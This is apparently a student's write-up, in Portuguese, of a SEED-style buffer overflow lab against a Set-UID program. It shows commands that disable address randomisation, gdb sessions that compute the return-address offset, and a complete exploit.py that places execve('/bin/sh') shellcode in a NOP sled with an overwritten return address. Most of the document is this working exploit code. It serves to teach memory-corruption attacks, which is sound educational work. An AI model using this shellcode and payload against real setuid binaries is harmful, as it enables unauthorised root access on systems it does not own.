# Buffer Overflow Attack Lab (Set-UID Version)

## Setup

- Primeiramente desativamos as contramedidas existentes que dificultariam o nosso ataque.

```Bash
$ sudo sysctl -w kernel.randomize_va_space=0
$ sudo ln -sf /bin/zsh /bin/sh
```

## Task 1

- Depois de brevemente analiasarmos o funcionamento do Shellcode, compilamos o prgrama `call_shellcode.c` que invoca a versão 32-bit Shellcode ou a versão 64-bit.

- Corremos os binários e em ambas as versões foi executada uma nova shell (`/bin/sh`).

![image](screenshots/LB5_1.png)

## Task 2

- Alteração da variável `L1` para 100+8*7.

- Através do comando `make stack-L1` compilámos o programa vulnerável e tornámo-lo num root-owned Set-UID program. 

## Task 3

- Criámos um ficheiro ``badfile` e usámos o `gdb` para fazer debug a `stack-L1-dbg`.

```Bash
$ gdb stack-L1-dbg
gdb-peda$ b bof
Breakpoint 1 at 0x12ad: file stack.c, line 16.
gdb-peda$ run 
...
Breakpoint 1, bof (str=0xffffcf57 ...) at stack.c:16
16 {
gdb-peda$ next
...
20 strcpy(buffer, str);
gdb-peda$ p $ebp
$1 = (void *) 0xffffcaf8
gdb-peda$ p &buffer
$2 = (char (*)[156]) 0xffffca54
gdb-peda$ p/d 0xffffcaf8 - 0xffffca54
$3 = 164
```

- Obtivemos as informações necessárias e alterámos o ficheiro `exploit.py` para lançar o ataque.

```c
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
"\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 300              # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    =  0xffffcb90   # Change this number 
offset = 164 + 4         # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```



